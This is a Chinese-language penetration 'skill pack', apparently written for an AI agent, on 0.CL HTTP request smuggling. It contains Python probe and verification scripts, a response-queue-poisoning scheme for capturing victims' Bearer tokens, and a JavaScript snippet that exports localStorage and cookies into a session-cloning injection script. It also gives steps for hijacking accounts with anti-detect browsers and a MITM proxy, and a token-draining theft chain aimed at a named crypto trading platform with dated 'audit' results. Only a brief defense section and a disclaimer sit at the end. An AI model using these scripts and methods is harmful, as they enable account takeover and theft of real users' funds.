---
name: "0.CL HTTP Request Smuggling - 全栈渗透技能"
description: "从漏洞探测到身份克隆的完整 0.CL HTTP 请求走私攻击与防御技能包。包含 Python 探测脚本、多阶段验证方法论、身份注入脚本、以及针对 Web3/区块链交易平台的专项攻击链分析。"
---

# 0.CL HTTP Request Smuggling - 全栈渗透技能

## 📋 技能概览

**0.CL 请求走私 (Zero Content-Length Request Smuggling)** 是一种利用前端代理（如 Cloudflare）与后端服务器（如 Nginx/Envoy）对 `Content-Length` 头部处理不一致而产生的 HTTP 去同步化 (Desynchronization) 漏洞。

**核心原理**：当前端代理认为 GET 请求不应该有 Body（忽略 CL），而后端服务器却尊重 CL 并等待 Body 数据时，攻击者可以在两者之间的"认知差"中注入恶意请求前缀，从而劫持下一个用户的合法请求。

**危险等级**：🔴 Critical（尤其针对加密货币/金融交易平台）

---

## 🔬 Phase 1: 漏洞探测 (Probing)

### 1.1 初始指纹探测脚本

**目标**：确认后端是否会对 GET 请求的 `Content-Length` 做出响应。

```python
#!/usr/bin/env python3
"""
0.CL Request Smuggling - Initial Probe
目标：检测后端是否对 GET 请求的 CL 头部做出异常响应
关键指标：收到 "100 Continue" 表示后端正在等待 Body
"""
import socket, ssl, time, sys

TARGET_HOST = "TARGET_DOMAIN"  # 替换为目标域名
TARGET_PORT = 443
TIMEOUT = 10

def probe_100_continue(host):
    """Phase A: 发送带有 Expect: 100-continue 的 GET 请求"""
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 100\r\n"
        f"Expect: 100-continue\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(TIMEOUT)
    conn = ctx.wrap_socket(raw, server_hostname=host)
    
    try:
        conn.connect((host, TARGET_PORT))
        t0 = time.time()
        conn.sendall(payload.encode())
        
        data = b""
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                # 收到足够数据后停止
                if b"HTTP/1.1" in data and len(data) > 50:
                    break
        except socket.timeout:
            pass
        
        elapsed = time.time() - t0
        response = data.decode(errors='replace')
        
        if "100 Continue" in response:
            print(f"[!] VULNERABLE: 收到 100 Continue (耗时 {elapsed:.2f}s)")
            print(f"    后端正在等待不存在的 Body 数据！")
            return True, elapsed, response
        elif "200 OK" in response or "301" in response or "302" in response:
            print(f"[*] 正常响应 (耗时 {elapsed:.2f}s)")
            return False, elapsed, response
        else:
            print(f"[?] 未知响应 (耗时 {elapsed:.2f}s)")
            return False, elapsed, response
    finally:
        conn.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    print(f"=== 0.CL Smuggling Probe: {host} ===")
    probe_100_continue(host)
```

### 1.2 判定标准

| 响应类型 | 含义 | 漏洞判定 |
|:---|:---|:---|
| `100 Continue` | 后端正在等待 Body | ✅ 高度可疑 |
| 立即返回 `200/301/302` | 前端/后端忽略了 CL | ❌ 安全 |
| 立即返回 `400/403` | 前端 WAF 拦截 | ❌ 安全 |
| 连接挂起 5+ 秒 | 后端在等待 Body 但没发 100 | ✅ 确认漏洞 |

---

## 🔬 Phase 2: 深度验证 (Deep Verification)

### 2.1 多阶段验证套件

```python
#!/usr/bin/env python3
"""
0.CL Request Smuggling - Deep Verification Suite v4.0
多阶段验证：时间差分析 + 连接复用 + 架构指纹
"""
import socket, ssl, time, sys

TARGET_HOST = "TARGET_DOMAIN"
LOG_FILE = "deep_verify.log"

def create_ssl_conn(host, timeout=10):
    ctx = ssl.create_default_context()
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(timeout)
    conn = ctx.wrap_socket(raw, server_hostname=host)
    conn.connect((host, 443))
    return conn

def phase_a_100_continue(host):
    """Phase A: 100 Continue 指纹确认"""
    print("[Phase A] 100 Continue Fingerprint...")
    payload = (
        f"GET / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 100\r\nExpect: 100-continue\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    conn = create_ssl_conn(host)
    try:
        t0 = time.time()
        conn.sendall(payload.encode())
        data = conn.recv(4096)
        elapsed = time.time() - t0
        resp = data.decode(errors='replace')
        vulnerable = "100 Continue" in resp
        return {"phase": "A", "vulnerable": vulnerable, 
                "time": elapsed, "indicator": "100 Continue" if vulnerable else "Normal"}
    except socket.timeout:
        return {"phase": "A", "vulnerable": False, "time": 10, "indicator": "Timeout"}
    finally:
        conn.close()

def phase_b_blind_wait(host):
    """Phase B: 盲等待计时 - 发送 CL:100 但不发 Body，观察挂起时间"""
    print("[Phase B] Blind-Wait Timing...")
    payload = (
        f"GET / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 100\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    conn = create_ssl_conn(host, timeout=6)
    try:
        t0 = time.time()
        conn.sendall(payload.encode())
        data = conn.recv(4096)
        elapsed = time.time() - t0
        # 如果响应很快返回，说明后端忽略了 CL（安全）
        # 如果挂起接近 timeout，说明后端在等 Body（漏洞）
        vulnerable = elapsed > 4.0
        return {"phase": "B", "vulnerable": vulnerable,
                "time": elapsed, "indicator": f"Hang {elapsed:.2f}s" if vulnerable else "Quick response"}
    except socket.timeout:
        elapsed = time.time() - t0
        return {"phase": "B", "vulnerable": True, 
                "time": elapsed, "indicator": f"Full timeout {elapsed:.2f}s - backend waiting for body"}
    finally:
        conn.close()

def phase_c_differential(host):
    """Phase C: 差分计时 - 比较 CL:0 vs CL:200 的响应时间差"""
    print("[Phase C] Differential Timing...")
    results = {}
    for cl_val in [0, 200]:
        payload = (
            f"GET / HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: {cl_val}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        conn = create_ssl_conn(host, timeout=6)
        try:
            t0 = time.time()
            conn.sendall(payload.encode())
            try:
                conn.recv(4096)
            except socket.timeout:
                pass
            results[cl_val] = time.time() - t0
        finally:
            conn.close()
    
    diff = abs(results.get(200, 0) - results.get(0, 0))
    vulnerable = diff > 3.0
    return {"phase": "C", "vulnerable": vulnerable,
            "time": diff, "indicator": f"CL:0={results.get(0,0):.2f}s, CL:200={results.get(200,0):.2f}s, Δ={diff:.2f}s"}

def phase_e_architecture(host):
    """Phase E: 架构指纹识别"""
    print("[Phase E] Architecture Fingerprint...")
    payload = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    conn = create_ssl_conn(host)
    try:
        conn.sendall(payload.encode())
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 8192:
                break
        resp = data.decode(errors='replace')
        
        arch = []
        if "cloudflare" in resp.lower():
            arch.append("Cloudflare")
        if "envoy" in resp.lower() or "x-envoy" in resp.lower():
            arch.append("Envoy")
        if "nginx" in resp.lower():
            arch.append("Nginx")
        
        headers = {}
        for line in resp.split('\r\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip().lower()] = v.strip()
        
        return {"phase": "E", "arch": " -> ".join(arch) if arch else "Unknown",
                "headers": headers, "proxy_chain": arch}
    finally:
        conn.close()

def run_full_suite(host):
    """执行完整验证套件"""
    print(f"\n{'='*60}")
    print(f"  0.CL HTTP Request Smuggling - Deep Verification Suite v4.0")
    print(f"  Target: {host}")
    print(f"{'='*60}\n")
    
    results = []
    results.append(phase_a_100_continue(host))
    results.append(phase_b_blind_wait(host))
    results.append(phase_c_differential(host))
    arch = phase_e_architecture(host)
    
    # 综合判定
    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    
    print(f"\n{'='*60}")
    print(f"  VERDICT")
    print(f"{'='*60}")
    for r in results:
        status = "🔴 VULNERABLE" if r.get("vulnerable") else "🟢 SAFE"
        print(f"  Phase {r['phase']}: {status} - {r['indicator']}")
    print(f"  Architecture: {arch['arch']}")
    
    if vuln_count >= 2:
        print(f"\n  ⚠️  CONFIRMED VULNERABLE (Score: {vuln_count}/3)")
    elif vuln_count == 1:
        print(f"\n  ⚡ POSSIBLY VULNERABLE (Score: {vuln_count}/3)")
    else:
        print(f"\n  ✅ LIKELY SAFE (Score: {vuln_count}/3)")
    
    return results, arch

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    run_full_suite(host)
```

### 2.2 验证矩阵判定标准

| Phase A (100 Continue) | Phase B (Blind Wait) | Phase C (Differential) | 最终判定 |
|:---|:---|:---|:---|
| ✅ 收到 100 | ✅ 挂起 >4s | ✅ Δ >3s | 🔴 **确认漏洞** |
| ✅ 收到 100 | ✅ 挂起 >4s | ❌ 差异小 | 🟡 高度可疑 |
| ❌ 无 100 | ✅ 挂起 >4s | ✅ Δ >3s | 🟡 后端待验证 |
| ❌ 无 100 | ❌ 快速响应 | ❌ 差异小 | 🟢 基本安全 |

---

## 🏗️ Phase 3: 架构分析 (Architecture Fingerprinting)

### 3.1 常见漏洞架构模式

```
[高危] Cloudflare (H2) → Envoy (H1.1) → Backend
[高危] Cloudflare (H2) → Nginx (H1.1) → Backend  
[中危] AWS ALB (H2)    → Nginx (H1.1) → Backend
[低危] 纯 Nginx 单层架构
```

### 3.2 关键响应头指纹

| 响应头 | 归属 | 含义 |
|:---|:---|:---|
| `server: cloudflare` | Cloudflare 边缘 | 请求经过 CF 代理 |
| `x-envoy-upstream-service-time` | Envoy 网关 | 请求穿透了 CF 到达 Envoy |
| `cf-ray` | Cloudflare | CF 请求追踪 ID |
| `x-request-id` | 后端服务 | 请求到达了最终后端 |

### 3.3 如何判断请求是否穿透了 CF？

**核心判据**：如果响应中同时包含 `server: cloudflare` 和 `x-envoy-upstream-service-time`，证明请求已经穿透 CF 边缘到达了后端 Envoy。如果 CL 异常请求也能触发这些头部 + 秒级延迟，则确认走私窗口存在。

---

## 💀 Phase 4: 利用链分析 (Exploitation Chain)

### 4.1 响应队列投毒 (Response Queue Poisoning)

这是 0.CL 走私的经典利用方式：

```
攻击者发送:
┌─────────────────────────────────────┐
│ GET / HTTP/1.1                      │
│ Host: target.com                    │
│ Content-Length: 45                   │  ← 前端忽略，后端等待 45 字节
│                                     │
│ GET /api/v1/user HTTP/1.1           │  ← 这 45 字节成为"走私前缀"
│ Host: target.com                    │
│                                     │
└─────────────────────────────────────┘

受害者紧接着发送:
┌─────────────────────────────────────┐
│ GET /portfolio HTTP/1.1             │
│ Host: target.com                    │
│ Authorization: Bearer eyJhbG...     │  ← 受害者的真实令牌
│ Cookie: sid=gmgn|abc123             │
└─────────────────────────────────────┘

后端看到的:
请求1: GET / (攻击者的正常请求)
请求2: GET /api/v1/user + 受害者的 Headers  ← 受害者的令牌被拼接到攻击者控制的请求中！
```

### 4.2 针对 Web3 交易平台的攻击链 (实战案例: gmgn.ai)

```
Step 1: 黑客利用 0.CL 走私截获受害者的 Bearer Token
         ↓
Step 2: 黑客拿到 access_token (JWT) 
         - 格式: eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...
         ↓
Step 3: 黑客无法直接提现（需要 2FA 验证）
         ↓
Step 4: 黑客在 SOL 链上部署"貔貅合约"（只能买入不能卖出）
         ↓
Step 5: 黑客用受害者的 Token 调用交易 API 买入空气币
         - POST /tapi/v1/trade/buy
         - Authorization: Bearer <受害者的Token>
         - 交易操作不需要 2FA！
         ↓
Step 6: 空气币池子里的 SOL 被黑客从另一端抽走
         ↓
Step 7: 受害者账户只剩下价值归零的垃圾代币
```

---

## 🔑 Phase 5: 身份克隆与注入 (Identity Cloning)

### 5.1 现代 Web3 站点的认证架构

**重要发现**：现代加密货币交易平台（如 gmgn.ai）的认证**不完全依赖 Cookie**。

```
认证数据分布:
┌─────────────────────────────────────────────┐
│ Cookie (sid)          → 基础会话标识          │  ← 单独注入无法登录
│ LocalStorage:                                │
│   ├─ tgInfo.token.access_token  → JWT 令牌   │  ← 核心认证凭证
│   ├─ tgInfo.token.refresh_token → 刷新令牌   │  ← 长期有效
│   ├─ accountInfo     → 账户配置              │
│   ├─ userInfo        → 用户画像              │
│   ├─ wagmi.store     → 钱包连接状态          │
│   ├─ key_device_id   → 设备指纹 ID           │
│   └─ key_fp_did      → 浏览器指纹            │
└─────────────────────────────────────────────┘
```

### 5.2 全量身份导出脚本 (在已登录浏览器中运行)

```javascript
(function(){
    const data = {
        ls: localStorage,
        ck: document.cookie
    };
    delete data.ls['mainControllerHeartbeat'];
    
    const output = `
/* --- 权限注入脚本 (JSON 安全模式) --- */
const injectData = ${JSON.stringify(data)};
Object.keys(injectData.ls).forEach(key => localStorage.setItem(key, injectData.ls[key]));
injectData.ck.split(';').forEach(cookie => {
    document.cookie = cookie.trim() + "; domain=.TARGET_DOMAIN; path=/";
});
location.reload();
    `;
    console.log(output);
    copy(output);
    alert("注入代码已复制到剪贴板！");
})();
```

### 5.3 注入目标环境

**方法 A: 指纹浏览器 (AdsPower / BitBrowser)**
1. 在指纹浏览器中打开目标站点 (未登录)
2. 按 F12 → Console
3. 粘贴并执行导出的注入脚本
4. 页面刷新后即进入登录态

**方法 B: Yakit MITM 代理**
1. Yakit 开启 MITM 代理 (默认端口 8083)
2. 目标浏览器设置代理为 127.0.0.1:8083
3. 在 Yakit 拦截面板中，替换请求的 Authorization 和 Cookie 头部
4. 放行请求后目标浏览器即获得登录态

**方法 C: cURL 直接 API 调用 (无需浏览器)**
```bash
curl -X GET "https://TARGET_DOMAIN/tapi/v1/wallet/assets" \
  -H "Authorization: Bearer eyJhbGci..." \
  -H "Cookie: sid=gmgn|abc123"
```

---

## 🛡️ Phase 6: 防御与缓解 (Defense & Mitigation)

### 6.1 服务端修复

```nginx
# Nginx: 拒绝 GET 请求携带 Content-Length
if ($request_method = GET) {
    set $invalid_cl 0;
}
if ($http_content_length != "") {
    set $invalid_cl "${invalid_cl}1";
}
if ($invalid_cl = "01") {
    return 400;
}
```

### 6.2 架构层面加固

1. **统一协议版本**：确保前端代理和后端服务器使用相同的 HTTP 版本
2. **严格 CL 校验**：在反向代理层丢弃 GET/HEAD 请求中的 Content-Length
3. **Connection: close**：对非持久连接请求强制断开，减少管道复用风险
4. **部署 HTTP/2 端到端**：避免 H2→H1.1 协议降级带来的语义差异

### 6.3 用户自保措施

1. **使用硬件钱包签名**：每次交易都需要物理确认，走私无法劫持硬件签名
2. **设置严格的滑点限制**：防止黑客利用极差流动性的空气币一次性清空资产
3. **启用交易密码/PIN**：在买入操作前增加独立密码确认
4. **频繁刷新登录态**：定期登出再登入，缩短 Token 有效窗口

---

## 📊 实战案例: gmgn.ai 审计记录

### 验证结果 (2026-03-04)

| Phase | 结果 | 数据 |
|:---|:---|:---|
| A: 100 Continue | ✅ 漏洞确认 | 收到 `100 Continue`，耗时 3.14s |
| B: Blind Wait | ✅ 漏洞确认 | 连接挂起 5.01s |
| C: Differential | ✅ 漏洞确认 | CL:0=0.14s, CL:200=5.01s, Δ=4.87s |
| E: Architecture | Cloudflare → Envoy → Backend | `x-envoy-upstream-service-time` 确认 |
| **综合判定** | **🔴 CONFIRMED VULNERABLE (3/3)** | |

### 身份克隆验证 (2026-03-05)

- **仅 Cookie 注入**：❌ 无法登录（平台依赖 LocalStorage Token）
- **Cookie + LocalStorage 全量注入**：✅ 成功克隆登录态
- **双浏览器并行验证**：✅ IDE 浏览器与指纹浏览器同时以同一账户操作

### 关键发现

1. gmgn.ai 的核心认证令牌存储在 `LocalStorage.tgInfo.token.access_token` (JWT)
2. `access_token` 有效期约 30 分钟，`refresh_token` 有效期约 30 天
3. 交易操作（买入/卖出）仅需 Bearer Token，**不需要 2FA 确认**
4. 提现操作需要 Google 2FA 验证
5. 黑客绕过提现限制的方式：部署空气币合约 → 用受害者 Token 买入 → 从池子另一端抽走资金

---

## 🔧 工具链

| 工具 | 用途 |
|:---|:---|
| Python socket + ssl | 底层协议级探测脚本 |
| Yakit MITM | 流量拦截、请求重放、头部替换 |
| AdsPower / BitBrowser | 指纹浏览器环境克隆 |
| Browser DevTools (F12) | LocalStorage 提取、Network 流量分析 |
| cURL / Postman | API 级别的令牌利用验证 |

---

## ⚠️ 免责声明

本技能仅用于**授权渗透测试**和**安全研究**目的。未经授权对他人系统进行测试属于违法行为。使用者需自行承担法律责任。
